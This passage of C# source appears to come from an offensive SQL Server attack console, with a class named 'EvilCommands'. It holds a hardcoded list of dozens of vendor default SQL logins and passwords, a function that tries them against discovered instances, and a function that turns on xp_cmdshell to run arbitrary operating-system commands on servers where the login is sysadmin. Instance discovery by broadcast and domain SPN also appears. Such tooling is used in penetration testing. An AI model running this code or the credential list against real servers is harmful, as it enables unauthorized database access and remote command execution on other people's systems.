							    SUBSTRING(@@VERSION, CHARINDEX('2', @@VERSION), 4) as [SQLServerMajorVersion],
							    serverproperty('Edition') as [SQLServerEdition],
							    SERVERPROPERTY('ProductLevel') AS [SQLServerServicePack],
							    SUBSTRING(@@VERSION, CHARINDEX('x', @@VERSION), 3) as [OSArchitecture],
							    RIGHT(SUBSTRING(@@VERSION, CHARINDEX('Windows NT', @@VERSION), 14), 3) as [OsVersionNumber],
							    SYSTEM_USER as [Currentlogin],
							    (select IS_SRVROLEMEMBER('sysadmin')) as IsSysadmin";

                            SqlConnection conn = new SqlConnection(ConnectionString);
                            SqlCommand QueryCommand = new SqlCommand(fullcommand, conn);
                            conn.Open();

                            // Read data into data table
                            DataTable dt = new DataTable();
                            SqlDataAdapter da = new SqlDataAdapter(QueryCommand);
                            da.Fill(dt);

                            foreach (DataRow CurrentRecord in dt.Select())
                            {

                                // Display SQL Server information
                                Console.WriteLine("\nInstance             : " + CurrentRecord["Instance"].ToString());
                                Console.WriteLine("Domain               : " + CurrentRecord["DomainName"].ToString());
                                Console.WriteLine("Service PID          : " + CurrentRecord["ServiceProcessID"].ToString());
                                Console.WriteLine("Service Name         : " + CurrentRecord["ServiceName"].ToString());
                                Console.WriteLine("Service Account      : " + CurrentRecord["ServiceAccount"].ToString());
                                Console.WriteLine("Authentication Mode  : " + CurrentRecord["AuthenticationMode"].ToString());
                                Console.WriteLine("Forced Encryption    : " + CurrentRecord["ForcedEncryption"].ToString());
                                Console.WriteLine("Clustered            : " + CurrentRecord["Clustered"].ToString());
                                Console.WriteLine("SQL Version          : " + CurrentRecord["SQLServerMajorVersion"].ToString());
                                Console.WriteLine("SQL Version Number   : " + CurrentRecord["SQLServerVersionNumber"].ToString());
                                Console.WriteLine("SQL Edition          : " + CurrentRecord["SQLServerEdition"].ToString());
                                Console.WriteLine("SQL Service Pack     : " + CurrentRecord["SQLServerServicePack"].ToString());
                                Console.WriteLine("OS Architecture      : " + CurrentRecord["OSArchitecture"].ToString());
                                Console.WriteLine("OS Version Number    : " + CurrentRecord["OsVersionNumber"].ToString());
                                Console.WriteLine("Login                : " + CurrentRecord["CurrentLogin"].ToString());
                                Console.WriteLine("Login is Sysadmin    : " + CurrentRecord["IsSysadmin"].ToString());

                                // Add to access list								
                                EvilCommands.MasterAccessList.Rows.Add(CurrentRecord["Instance"].ToString(), CurrentRecord["DomainName"].ToString(), CurrentRecord["ServiceProcessID"].ToString(), CurrentRecord["ServiceName"].ToString(), CurrentRecord["ServiceAccount"].ToString(), CurrentRecord["AuthenticationMode"].ToString(), CurrentRecord["ForcedEncryption"].ToString(), CurrentRecord["Clustered"].ToString(), CurrentRecord["SQLServerMajorVersion"].ToString(), CurrentRecord["SQLServerVersionNumber"].ToString(), CurrentRecord["SQLServerEdition"].ToString(), CurrentRecord["SQLServerServicePack"].ToString(), CurrentRecord["OSArchitecture"].ToString(), CurrentRecord["OsVersionNumber"].ToString(), CurrentRecord["CurrentLogin"].ToString(), CurrentRecord["IsSysadmin"].ToString(), PasswordG);

                                // Add to count
                                countAccessible = countAccessible + 1;
                            }
                        }
                        catch (SqlException ex)
                        {
                            Console.WriteLine("" + instance + ": CONNECTION OR QUERY FAILED");
                            if (VerboseG)
                            {
                                Console.WriteLine("\n" + ex.Errors[0].Message + "\n");
                            }
                        }
                    }
                    Console.WriteLine("\n" + countAccessible + " instances can be logged into.");
                }
                else
                {
                    Console.WriteLine("\nNo target instances have been defined.");
                }
                return null;
            }

            // ------------------------------------------------------------
            // FUNCTION: CHECKDEFAULTAPPPW 
            // ------------------------------------------------------------
            public static string CheckDefaultAppPw()
            {
                CheckQueryReady();
                if (ReadyforQueryG)
                {
                    // Create list 
                    IList<string> TargetList = new List<string>();

                    // Add all
                    // https://www.c-sharpcorner.com/UploadFile/0f68f2/querying-a-data-table-using-select-method-and-lambda-express/									   
                    if (InstanceAllG)
                    {
                        foreach (DataRow CurrentRecord in EvilCommands.MasterDiscoveredList.Select())
                        {
                            TargetList.Add(CurrentRecord["Instance"].ToString());
                        }
                    }

                    // Add instance
                    if (!InstanceG.Equals(""))
                    {
                        TargetList.Add(InstanceG);
                    }

                    // Create data table for default password 
                    DataTable DefaultPasswordList = new DataTable();
                    DefaultPasswordList.Columns.Add("DefaultInstance");
                    DefaultPasswordList.Columns.Add("DefaultUsername");
                    DefaultPasswordList.Columns.Add("DefaultPassword");
                    DefaultPasswordList.Rows.Add("ACS", "ej", "ej");
                    DefaultPasswordList.Rows.Add("ACT7", "sa", "sage");
                    DefaultPasswordList.Rows.Add("AOM2", "admin", "ca_admin");
                    DefaultPasswordList.Rows.Add("ARIS", "ARIS9", "*ARIS!1dm9n#");
                    DefaultPasswordList.Rows.Add("AutodeskVault", "sa", "AutodeskVault@26200");
                    DefaultPasswordList.Rows.Add("BOSCHSQL", "sa", "RPSsql12345");
                    DefaultPasswordList.Rows.Add("BPASERVER9", "sa", "AutoMateBPA9");
                    DefaultPasswordList.Rows.Add("CDRDICOM", "sa", "CDRDicom50!");
                    DefaultPasswordList.Rows.Add("CODEPAL", "sa", "Cod3p@l");
                    DefaultPasswordList.Rows.Add("CODEPAL08", "sa", "Cod3p@l");
                    DefaultPasswordList.Rows.Add("CounterPoint", "sa", "CounterPoint8");
                    DefaultPasswordList.Rows.Add("CSSQL05", "ELNAdmin", "ELNAdmin");
                    DefaultPasswordList.Rows.Add("CSSQL05", "sa", "CambridgeSoft_SA");
                    DefaultPasswordList.Rows.Add("CADSQL", "CADSQLAdminUser", "Cr41g1sth3M4n!");
                    DefaultPasswordList.Rows.Add("DHLEASYSHIP", "sa", "DHLadmin@1");
                    DefaultPasswordList.Rows.Add("DPM", "admin", "ca_admin");
                    DefaultPasswordList.Rows.Add("DVTEL", "sa", "");
                    DefaultPasswordList.Rows.Add("EASYSHIP", "sa", "DHLadmin@1");
                    DefaultPasswordList.Rows.Add("ECC", "sa", "Webgility2011");
                    DefaultPasswordList.Rows.Add("ECOPYDB", "e+C0py2007_@x", "e+C0py2007_@x");
                    DefaultPasswordList.Rows.Add("ECOPYDB", "sa", "ecopy");
                    DefaultPasswordList.Rows.Add("Emerson2012", "sa", "42Emerson42Eme");
                    DefaultPasswordList.Rows.Add("HDPS", "sa", "sa");
                    DefaultPasswordList.Rows.Add("HPDSS", "sa", "Hpdsdb000001");
                    DefaultPasswordList.Rows.Add("HPDSS", "sa", "hpdss");
                    DefaultPasswordList.Rows.Add("INSERTGT", "msi", "keyboa5");
                    DefaultPasswordList.Rows.Add("INSERTGT", "sa", "");
                    DefaultPasswordList.Rows.Add("INTRAVET", "sa", "Webster#1");
                    DefaultPasswordList.Rows.Add("MYMOVIES", "sa", "t9AranuHA7");
                    DefaultPasswordList.Rows.Add("PCAMERICA", "sa", "pcAmer1ca");
                    DefaultPasswordList.Rows.Add("PRISM", "sa", "SecurityMaster08");
                    DefaultPasswordList.Rows.Add("RMSQLDATA", "Super", "Orange");
                    DefaultPasswordList.Rows.Add("RTCLOCAL", "sa", "mypassword");
                    DefaultPasswordList.Rows.Add("RBAT", "sa", "34TJ4@#$");
                    DefaultPasswordList.Rows.Add("RIT", "sa", "34TJ4@#$");
                    DefaultPasswordList.Rows.Add("RCO", "sa", "34TJ4@#$");
                    DefaultPasswordList.Rows.Add("REDBEAM", "sa", "34TJ4@#$");
                    DefaultPasswordList.Rows.Add("SALESLOGIX", "sa", "SLXMaster");
                    DefaultPasswordList.Rows.Add("SIDEXIS_SQL", "sa", "2BeChanged");
                    DefaultPasswordList.Rows.Add("SQL2K5", "ovsd", "ovsd");
                    DefaultPasswordList.Rows.Add("SQLEXPRESS", "admin", "ca_admin");
                    DefaultPasswordList.Rows.Add("SQLEXPRESS", "gcs_client", "SysGal.5560");     //SA password = GCSsa5560    
                    DefaultPasswordList.Rows.Add("SQLEXPRESS", "gcs_web_client", "SysGal.5560"); //SA password = GCSsa5560
                    DefaultPasswordList.Rows.Add("SQLEXPRESS", "NBNUser", "NBNPassword");
                    DefaultPasswordList.Rows.Add("STANDARDDEV2014", "test", "test");
                    DefaultPasswordList.Rows.Add("TEW_SQLEXPRESS", "tew", "tew");
                    DefaultPasswordList.Rows.Add("vocollect", "vocollect", "vocollect");
                    DefaultPasswordList.Rows.Add("VSDOTNET", "sa", "");
                    DefaultPasswordList.Rows.Add("VSQL", "sa", "111");
                    DefaultPasswordList.Rows.Add("CASEWISE", "sa", "");
                    DefaultPasswordList.Rows.Add("VANTAGE", "sa", "vantage12!");
                    DefaultPasswordList.Rows.Add("BCM", "bcmdbuser", "Bcmuser@06");
                    DefaultPasswordList.Rows.Add("BCM", "bcmdbuser", "Numara@06");
                    DefaultPasswordList.Rows.Add("DEXIS_DATA", "sa", "dexis");
                    DefaultPasswordList.Rows.Add("DEXIS_DATA", "dexis", "dexis");
                    DefaultPasswordList.Rows.Add("SMTKINGDOM", "SMTKINGDOM", "$ei$micMicro");
                    DefaultPasswordList.Rows.Add("RE7_MS", "Supervisor", "Supervisor");
                    DefaultPasswordList.Rows.Add("SPSQL", "sa", "SecurityMaster08");
                    DefaultPasswordList.Rows.Add("CAREWARE", "sa", "");
                    DefaultPasswordList.Rows.Add("RE7_MS", "Admin", "Admin");
                    DefaultPasswordList.Rows.Add("OHD", "sa", "ohdusa@123");
                    DefaultPasswordList.Rows.Add("UPC", "serviceadmin", "Password.0");          //Maybe a local windows account
                    DefaultPasswordList.Rows.Add("Hirsh", "Velocity", "i5X9FG42");
                    DefaultPasswordList.Rows.Add("Hirsh", "sa", "i5X9FG42");
                    //Database=OMEssentials; Username=omeadmin; Instance=server\SQLEXPRESSOME;product=OpenManage Essentials;

                    // Get list count
                    var count = TargetList.Count;
                    int guessCount = 0;
                    Console.WriteLine("\n" + count + " instances will be targeted.");

                    // Loop through target list 
                    foreach (var instance in TargetList)
                    {

                        // Set variables
                        string DefaultInstance = "";
                        string DefaultUsername = "";
                        string DefaultPassword = "";

                        // Check if instance is on the default list - fix to test login, and target dif logins for same instance 
                        // https://docs.microsoft.com/en-us/dotnet/api/system.data.datatable.select?view=netframework-4.8
                        // https://www.c-sharpcorner.com/UploadFile/0f68f2/querying-a-data-table-using-select-method-and-lambda-express/
                        foreach (DataRow DefaultRecord in DefaultPasswordList.Select())
                        {
                            // Check if match
                            if (instance.ToLower().Contains(DefaultRecord["DefaultInstance"].ToString().ToLower()))
                            {
                                // Set variable for match
                                DefaultInstance = DefaultRecord["DefaultInstance"].ToString();
                                DefaultUsername = DefaultRecord["DefaultUsername"].ToString();
                                DefaultPassword = DefaultRecord["DefaultPassword"].ToString();

                                // Attempt Connection if exists
                                if (!DefaultInstance.Equals(""))
                                {
                                    // Status user 
                                    Console.Write("\n" + instance + ": INSTANCE NAME MATCH FOUND - " + DefaultInstance);
                                    Console.Write("\n" + instance + ": ATTEMPTING LOGIN with Username: " + DefaultUsername + " Password: " + DefaultPassword + "\n");

                                    try
                                    {
                                        // Setup connection string
                                        string ConnectionString = CreateConnectionString(instance, DefaultUsername, DefaultPassword, "SqlLogin", "master");

                                        // Execute query							
                                        string fullcommand = @"
											    -- Get SQL Server Information

											    -- Get SQL Server Service Name and Path
											    DECLARE @SQLServerInstance varchar(250)
											    DECLARE @SQLServerServiceName varchar(250)
											    if @@SERVICENAME = 'MSSQLSERVER'
											    BEGIN
											    set @SQLServerInstance = 'SYSTEM\CurrentControlSet\Services\MSSQLSERVER'
											    set @SQLServerServiceName = 'MSSQLSERVER'
											    END
											    ELSE
											    BEGIN
											    set @SQLServerInstance = 'SYSTEM\CurrentControlSet\Services\MSSQL$'+cast(@@SERVICENAME as varchar(250))
											    set @SQLServerServiceName = 'MSSQL$'+cast(@@SERVICENAME as varchar(250))
											    END

											    -- Get SQL Server Service Account
											    DECLARE @ServiceaccountName varchar(250)
											    EXECUTE master.dbo.xp_instance_regread
											    N'HKEY_LOCAL_MACHINE', @SQLServerInstance,
											    N'ObjectName',@ServiceAccountName OUTPUT, N'no_output'

											    -- Get authentication mode
											    DECLARE @AuthenticationMode INT
											    EXEC master.dbo.xp_instance_regread N'HKEY_LOCAL_MACHINE',
											    N'Software\Microsoft\MSSQLServer\MSSQLServer',
											    N'LoginMode', @AuthenticationMode OUTPUT

											    -- Get the forced encryption flag
											    BEGIN TRY 
												    DECLARE @ForcedEncryption INT
												    EXEC master.dbo.xp_instance_regread N'HKEY_LOCAL_MACHINE',
												    N'SOFTWARE\MICROSOFT\Microsoft SQL Server\MSSQLServer\SuperSocketNetLib',
												    N'ForceEncryption', @ForcedEncryption OUTPUT
											    END TRY
											    BEGIN CATCH	            
											    END CATCH

											    -- Return server and version information
											    SELECT  @@servername as [Instance],
											    DEFAULT_DOMAIN() as [DomainName],
											    SERVERPROPERTY('processid') as ServiceProcessID,
											    @SQLServerServiceName as [ServiceName],
											    @ServiceAccountName as [ServiceAccount],
											    (SELECT CASE @AuthenticationMode
											    WHEN 1 THEN 'Windows Authentication'
											    WHEN 2 THEN 'Windows and SQL Server Authentication'
											    ELSE 'Unknown'
											    END) as [AuthenticationMode],
											    @ForcedEncryption as ForcedEncryption,
											    CASE  SERVERPROPERTY('IsClustered')
											    WHEN 0
											    THEN 'No'
											    ELSE 'Yes'
											    END as [Clustered],
											    SERVERPROPERTY('productversion') as [SQLServerVersionNumber],
											    SUBSTRING(@@VERSION, CHARINDEX('2', @@VERSION), 4) as [SQLServerMajorVersion],
											    serverproperty('Edition') as [SQLServerEdition],
											    SERVERPROPERTY('ProductLevel') AS [SQLServerServicePack],
											    SUBSTRING(@@VERSION, CHARINDEX('x', @@VERSION), 3) as [OSArchitecture],
											    RIGHT(SUBSTRING(@@VERSION, CHARINDEX('Windows NT', @@VERSION), 14), 3) as [OsVersionNumber],
											    SYSTEM_USER as [Currentlogin],
											    (select IS_SRVROLEMEMBER('sysadmin')) as IsSysadmin";

                                        SqlConnection conn = new SqlConnection(ConnectionString);
                                        SqlCommand QueryCommand = new SqlCommand(fullcommand, conn);
                                        conn.Open();

                                        // Read data into data table
                                        DataTable dt = new DataTable();
                                        SqlDataAdapter da = new SqlDataAdapter(QueryCommand);
                                        da.Fill(dt);

                                        foreach (DataRow CurrentRecord in dt.Select())
                                        {

                                            // Display SQL Server information
                                            Console.WriteLine("\nInstance             : " + CurrentRecord["Instance"].ToString());
                                            Console.WriteLine("Domain               : " + CurrentRecord["DomainName"].ToString());
                                            Console.WriteLine("Service PID          : " + CurrentRecord["ServiceProcessID"].ToString());
                                            Console.WriteLine("Service Name         : " + CurrentRecord["ServiceName"].ToString());
                                            Console.WriteLine("Service Account      : " + CurrentRecord["ServiceAccount"].ToString());
                                            Console.WriteLine("Authentication Mode  : " + CurrentRecord["AuthenticationMode"].ToString());
                                            Console.WriteLine("Forced Encryption    : " + CurrentRecord["ForcedEncryption"].ToString());
                                            Console.WriteLine("Clustered            : " + CurrentRecord["Clustered"].ToString());
                                            Console.WriteLine("SQL Version          : " + CurrentRecord["SQLServerMajorVersion"].ToString());
                                            Console.WriteLine("SQL Version Number   : " + CurrentRecord["SQLServerVersionNumber"].ToString());
                                            Console.WriteLine("SQL Edition          : " + CurrentRecord["SQLServerEdition"].ToString());
                                            Console.WriteLine("SQL Service Pack     : " + CurrentRecord["SQLServerServicePack"].ToString());
                                            Console.WriteLine("OS Architecture      : " + CurrentRecord["OSArchitecture"].ToString());
                                            Console.WriteLine("OS Version Number    : " + CurrentRecord["OsVersionNumber"].ToString());
                                            Console.WriteLine("Login                : " + CurrentRecord["CurrentLogin"].ToString());
                                            Console.WriteLine("Password             : " + DefaultPassword);
                                            Console.WriteLine("Login is Sysadmin    : " + CurrentRecord["IsSysadmin"].ToString());

                                            // Add to access list
                                            EvilCommands.MasterAccessList.Rows.Add(CurrentRecord["Instance"].ToString(), CurrentRecord["DomainName"].ToString(), CurrentRecord["ServiceProcessID"].ToString(), CurrentRecord["ServiceName"].ToString(), CurrentRecord["ServiceAccount"].ToString(), CurrentRecord["AuthenticationMode"].ToString(), CurrentRecord["ForcedEncryption"].ToString(), CurrentRecord["Clustered"].ToString(), CurrentRecord["SQLServerMajorVersion"].ToString(), CurrentRecord["SQLServerVersionNumber"].ToString(), CurrentRecord["SQLServerEdition"].ToString(), CurrentRecord["SQLServerServicePack"].ToString(), CurrentRecord["OSArchitecture"].ToString(), CurrentRecord["OsVersionNumber"].ToString(), CurrentRecord["CurrentLogin"].ToString(), CurrentRecord["IsSysadmin"].ToString(), DefaultPassword);

                                            // Add to passwords found count 
                                            guessCount = guessCount + 1;
                                        }
                                    }
                                    catch (SqlException ex)
                                    {
                                        Console.WriteLine("" + instance + ": LOGIN, CONNECITON, or QUERY FAILED");
                                        if (VerboseG)
                                        {
                                            Console.WriteLine("\n" + ex.Errors[0].Message + "\n");
                                        }
                                    }
                                }
                            }
                        }
                    }
                    Console.WriteLine("\n" + guessCount + " default passwords were found.");
                }
                else
                {
                    Console.WriteLine("\nNo target instances have been defined.");
                }
                return null;
            }

            // ------------------------------------------------------------
            // FUNCTION: RUNOSCMD
            // ------------------------------------------------------------
            public static string RunOsCmd(string command)
            {
                CheckQueryReady();
                if (ReadyforQueryG)
                {
                    // Create data table 
                    IList<string> TargetList = new List<string>();

                    // Add all
                    // https://www.c-sharpcorner.com/UploadFile/0f68f2/querying-a-data-table-using-select-method-and-lambda-express/	
                    DataView AccessView = new DataView(EvilCommands.MasterAccessList);
                    DataTable distinctValues = AccessView.ToTable(true, "Instance");
                    if (InstanceAllG)
                    {
                        foreach (DataRow CurrentRecord in distinctValues.Select())
                        {
                            TargetList.Add(CurrentRecord["Instance"].ToString());
                        }
                    }

                    // Add instance
                    if (!InstanceG.Equals(""))
                    {
                        TargetList.Add(InstanceG);
                    }

                    // Get list count
                    var count = TargetList.Count;
                    int tableCount = 0;
                    Console.WriteLine("\n" + count + " instances will be targeted.\n");


                    // Loops through target instances 
                    foreach (var instance in TargetList)
                    {

                        // Get sysadmin status 
                        Console.WriteLine("" + instance + ": CHECKING FOR SYSADMIN PRIVS.");
                        DataTable sysadmintbl = new DataTable();
                        string isSyadmin = "0";
                        try
                        {
                            string SysadminConnString = CreateConnectionString(instance, UsernameG, PasswordG, UsertypeG, "master");
                            string SysadminQuery = "select IS_SRVROLEMEMBER('sysadmin') as isSysadmin";
                            SqlConnection SysadminConn = new SqlConnection(SysadminConnString);
                            SqlCommand SysadminOutput = new SqlCommand(SysadminQuery, SysadminConn);
                            SysadminConn.Open();
                            SqlDataAdapter SysadminDA = new SqlDataAdapter(SysadminOutput);
                            SysadminDA.Fill(sysadmintbl);
                            SysadminConn.Close();
                        }
                        catch
                        {
                            Console.WriteLine("" + instance + ": CONNECTION OR QUERY FAILED.");
                        }

                        foreach (DataRow CurrentSysadmin in sysadmintbl.Select())
                        {
                            if (CurrentSysadmin["isSysadmin"].ToString().Equals("1"))
                            {
                                Console.WriteLine("" + instance + ": USER IS A SYSADMIN.");
                                isSyadmin = "1";
                            }
                            else
                            {
                                Console.WriteLine("" + instance + ": USER IS NOT A SYSADMIN.\n");
                            }
                        }

                        // Enable Advanced Options 
                        if (isSyadmin.Equals("1"))
                        {
                            // Get advoptions status 

                            Console.WriteLine("" + instance + ": ENABLING SHOW ADVANCED OPTIONS.");
                            DataTable advoptionstbl = new DataTable();
                            try
                            {
                                string advoptionsConnString = CreateConnectionString(instance, UsernameG, PasswordG, UsertypeG, "master");
                                string advoptionsQuery = @"sp_configure 'show advanced options',1;reconfigure;";
                                SqlConnection advoptionsConn = new SqlConnection(advoptionsConnString);
                                SqlCommand advoptionsOutput = new SqlCommand(advoptionsQuery, advoptionsConn);
                                advoptionsConn.Open();
                                SqlDataAdapter advoptionsDA = new SqlDataAdapter(advoptionsOutput);
                                advoptionsDA.Fill(advoptionstbl);
                                advoptionsConn.Close();
                            }
                            catch
                            {
                                Console.WriteLine("" + instance + ": UNABLED TO ENABLE SHOW ADVANCED OPTIONS.");
                            }
                        }

                        // Enable xp_cmdshell 
                        if (isSyadmin.Equals("1"))
                        {
                            // Get XpCmdShell status 
                            Console.WriteLine("" + instance + ": ENABLING XPCMDSHELL.");
                            DataTable XpCmdShelltbl = new DataTable();
                            try
                            {
                                string XpCmdShellConnString = CreateConnectionString(instance, UsernameG, PasswordG, UsertypeG, "master");
                                string XpCmdShellQuery = @"sp_configure 'xp_cmdshell',1;reconfigure;";
                                SqlConnection XpCmdShellConn = new SqlConnection(XpCmdShellConnString);
                                SqlCommand XpCmdShellOutput = new SqlCommand(XpCmdShellQuery, XpCmdShellConn);
                                XpCmdShellConn.Open();
                                SqlDataAdapter XpCmdShellDA = new SqlDataAdapter(XpCmdShellOutput);
                                XpCmdShellDA.Fill(XpCmdShelltbl);
                                XpCmdShellConn.Close();
                            }
                            catch
                            {
                                Console.WriteLine("" + instance + ": UNABLED TO ENABLE XP_CMDSHLL");
                            }
                        }

                        // Run command 	
                        if (isSyadmin.Equals("1"))
                        {
                            Console.WriteLine(instance + ": RUNNING COMMAND.");
                            DataTable Databases = new DataTable();
                            try
                            {
                                string ConnectionStringdb = CreateConnectionString(instance, UsernameG, PasswordG, UsertypeG, "master");
                                string DatabaseQuery = "EXEC master..xp_cmdshell '" + command + "' WITH RESULT SETS ((output VARCHAR(MAX)))";
                                SqlConnection conndb = new SqlConnection(ConnectionStringdb);
                                SqlCommand DbQueryOutput = new SqlCommand(DatabaseQuery, conndb);
                                conndb.Open();
                                SqlDataAdapter dadb = new SqlDataAdapter(DbQueryOutput);
                                dadb.Fill(Databases);
                                conndb.Close();
                                Console.WriteLine(instance + ": COMMAND RESULTS: \n");
                                tableCount = tableCount + 1;
                            }
                            catch
                            {
                                Console.WriteLine("" + instance + ": CONNECTION OR QUERY FAILED");
                            }

                            // Display results 
                            foreach (DataRow CurrentDatabase in Databases.Select())
                            {
                                // Get table list							
                                Console.WriteLine(CurrentDatabase["output"].ToString());
                            }
                        }
                    }
                    Console.WriteLine("\n" + tableCount + " servers ran the command.");
                }
                else
                {
                    Console.WriteLine("\nNo target instances have been defined.");
                }
                return null;
            }

            // --------------------------------
            //  FUNCTION: CheckQueryReady
            // --------------------------------
            public static string CheckQueryReady()
            {
                // Verify query targets have been defined
                if ((!ConnectionStringG.Equals("")) || InstanceAllG)
                {
                    ReadyforQueryG = true;
                }

                return null;
            }

            // --------------------------------
            // FUNCTION: CreateConnectionString
            // --------------------------------
            public static string CreateConnectionString(string instance, string username, string password, string usertype, string database)
            {
                // Seting empty connection string 
                string connectionString = "";

                // Create current Windows user 
                if (usertype.Equals("CurrentWindowsUser"))
                {
                    connectionString = "Server=" + instance + ";Database=" + database + ";Integrated Security=SSPI;Connection Timeout=" + TimeOutG + ";";
                }

                // Create Windows Domain user string
                if (usertype.Equals("WindowsDomainUser"))
                {
                    // connectionString = "Server=" + instance + ";Database=" + database + ";Integrated Security=SSPI;Connection Timeout=1" + TimeOutG + ";uid=" + username + ";pwd=" + password + ";";
                    connectionString = "Server=" + instance + ";Database=" + database + ";Persist Security Info=True;Connection Timeout=1" + TimeOutG + ";uid=" + username + ";pwd=" + password + ";";
                }

                // Create SQL Login string
                if (usertype.Equals("SqlLogin"))
                {
                    connectionString = "Server=" + instance + ";Database=" + database + ";Connection Timeout=" + TimeOutG + ";User ID=" + username + ";pwd=" + password + ";";
                }

                return connectionString;
            }
            #endregion commonfunctions

            // --------------------------------
            // FUNCTION: RunConsole / Query 
            // --------------------------------
            public static bool RunSQLConsole(string[] commandFromCommandLine)
            {
                // Setup columns for discovery table
                if (MasterDiscoveredList.Columns.Count == 0)
                {                    
                    MasterDiscoveredList.Columns.Add("Instance");
                    MasterDiscoveredList.Columns.Add("SamAccountName");
                }

                // Setup columns for access table
                if (MasterAccessList.Columns.Count == 0)
                {
                    MasterAccessList.Columns.Add("Instance");
                    MasterAccessList.Columns.Add("DomainName");
                    MasterAccessList.Columns.Add("ServiceProcessID");
                    MasterAccessList.Columns.Add("ServiceName");
                    MasterAccessList.Columns.Add("ServiceAccount");
                    MasterAccessList.Columns.Add("AuthenticationMode");
                    MasterAccessList.Columns.Add("ForcedEncryption");
                    MasterAccessList.Columns.Add("Clustered");
                    MasterAccessList.Columns.Add("SQLServerMajorVersion");
                    MasterAccessList.Columns.Add("SQLServerVersionNumber");
                    MasterAccessList.Columns.Add("SQLServerEdition");
                    MasterAccessList.Columns.Add("SQLServerServicePack");
                    MasterAccessList.Columns.Add("OSArchitecture");
                    MasterAccessList.Columns.Add("OsVersionNumber");
                    MasterAccessList.Columns.Add("CurrentLogin");
                    MasterAccessList.Columns.Add("IsSysadmin");
                    MasterAccessList.Columns.Add("CurrentLoginPassword");
                }
                
                // Collect multi-line command until "go" is given         
                string MyQuery = string.Empty;
                string fullcommand = string.Empty;

                bool multiline = true;

                int i = 0;
                do
                {
                    // Show multi-line input											
                    if (!multiline)
                    {
                        Console.Write("         > ");
                    }
                    else
                    {
                        Console.Write("SQLCLIENT> ");
                    }

                    if (null == commandFromCommandLine)
                    {
                        MyQuery = Console.ReadLine();
                    }
                    else
                    {
                        if (commandFromCommandLine.Length > i)
                        {
                            MyQuery = commandFromCommandLine[i++];
                            Console.WriteLine(MyQuery);
                        }
                        else
                        {
                            break;
                        }
                    }

                    fullcommand = fullcommand + "\n" + MyQuery;

                    // EXIT IF REQUESTED
                    if (MyQuery.Equals("exit", StringComparison.OrdinalIgnoreCase)
                        || MyQuery.Equals("quit", StringComparison.OrdinalIgnoreCase)
                        || MyQuery.Equals("bye", StringComparison.OrdinalIgnoreCase)
                    )
                    {
                        Environment.Exit(0);
                    }

                    // ----------------------------------------------------
                    // CONNECTION SETTINGS 
                    // ----------------------------------------------------
                    #region connection settings
                    if (multiline = MyQuery.Check("set connstring "))
                    {
                        ConnectionStringG = MyQuery.Replace("set connstring ", string.Empty);

                        // Unset other connection settings 
                        InstanceAllG = false;
                        InstanceG = string.Empty;
                        UsernameG = string.Empty;
                        UsertypeG = string.Empty;
                        PasswordG = string.Empty;

                        Console.WriteLine($"\nConnection string set to: {ConnectionStringG}");
                        fullcommand = "";
                    }
                    else if (multiline = MyQuery.Check("set instance "))
                    {
                        InstanceG = MyQuery.Replace("set instance ", "");
                        Console.WriteLine($"\nTarget instance set to: {InstanceG}");

                        ConnectionStringG = CreateConnectionString(InstanceG, UsernameG, PasswordG, UsertypeG, "master");
                        EvilCommands.MasterDiscoveredList.Rows.Add(InstanceG);
                        InstanceAllG = false;
                    }
                    else if (multiline = MyQuery.Check("set targetall "))
                    {
                        InstanceAllG = MyQuery.EnableDisable("set targetall ");
                        Console.WriteLine($"\n{(InstanceAllG ? "Enabled targeting of all discovered instances." : "Disabled targeting of all discovered instances")}");
                        ConnectionStringG = string.Empty;
                        InstanceG = string.Empty;
                    }
                    else if (multiline = MyQuery.Check("set username "))
                    {
                        UsernameG = MyQuery.ToLower().Replace("set username ", "");
                        Console.WriteLine($"\nUsername set to: {UsernameG}");

                        if (string.IsNullOrEmpty(UsernameG))
                        {
                            // Set to current windows users if blank
                            UsertypeG = "CurrentWindowsUser";
                        }
                        else if (UsernameG.ToLower().Contains("\\"))
                        {
                            // Update user type Domain or SQL 						
                            UsertypeG = "WindowsDomainUser";
                        }
                        else
                        {
                            UsertypeG = "SqlLogin";
                        }

                        ConnectionStringG = CreateConnectionString(InstanceG, UsernameG, PasswordG, UsertypeG, "master");
                    }
                    else if (multiline = MyQuery.Check("set password "))
                    {
                        PasswordG = MyQuery.Replace("set password ", "");
                        Console.WriteLine($"\nPassword set to: {PasswordG}");

                        ConnectionStringG = CreateConnectionString(InstanceG, UsernameG, PasswordG, UsertypeG, "master");
                    }
                    else if (multiline = MyQuery.Check("set timeout "))
                    {
                        TimeOutG = MyQuery.ToLower().Replace("set timeout ", string.Empty);
                        Console.WriteLine($"\nQuery timeout set to: {TimeOutG}");

                        ConnectionStringG = CreateConnectionString(InstanceG, UsernameG, PasswordG, UsertypeG, "master");
                    }
                    #endregion

                    // ----------------------------------------------------
                    // INSTANCE DISCOVERY COMMANDS
                    // ----------------------------------------------------	
                    #region discovery commands				
                    else if (multiline = MyQuery.Check("discover broadcast"))
                    {
                        GetSQLServersBroadCast();
                    }
                    else if (multiline = MyQuery.Check("discover domainspn"))
                    {
                        GetSQLServersSpn();
                    }
                    else if (multiline = MyQuery.Check("discover file"))
                    {
                        string[] filePath1 = MyQuery.ToLower().Split(new string[] { " " }, StringSplitOptions.RemoveEmptyEntries);

                        string parts = string.Empty;
                        if (filePath1.Length > 2)
                        {
                            parts = filePath1[2];
                        }

                        GetSQLServerFile(parts);
                    }
                    else if (multiline = MyQuery.Check("show discovered"))
                    {
                        ShowDiscovered();
                    }
                    else if (multiline = MyQuery.Check("export discovered"))
                    {
                        string[] filePath1 = MyQuery.ToLower().Split(new string[] { " " }, StringSplitOptions.RemoveEmptyEntries);

                        string targetPath = string.Empty;
                        if (filePath1.Length > 2)
                        {
                            targetPath = filePath1[2];
                        }

                        StringBuilder fileContent = new StringBuilder();

                        foreach (var col in EvilCommands.MasterDiscoveredList.Columns)
                        {
                            fileContent.Append(col.ToString() + ",");
                        }

                        fileContent.Replace(",", Environment.NewLine, fileContent.Length - 1, 1);
                        foreach (DataRow dr in EvilCommands.MasterDiscoveredList.Rows)
                        {
                            foreach (var column in dr.ItemArray)
                            {
                                fileContent.Append("\"" + column.ToString() + "\",");
                            }

                            fileContent.Replace(",", System.Environment.NewLine, fileContent.Length - 1, 1);
                        }

                        try
                        {
                            // write file output
                            File.WriteAllText(targetPath, fileContent.ToString());
                            Console.WriteLine("\n" + EvilCommands.MasterDiscoveredList.Rows.Count + " instances were written to " + targetPath);
                        }
                        catch
                        {
                            Console.WriteLine("\nUnable to write file.\n");
                        }
                    }
                    else if (multiline = MyQuery.Check("clear discovered"))
                    {
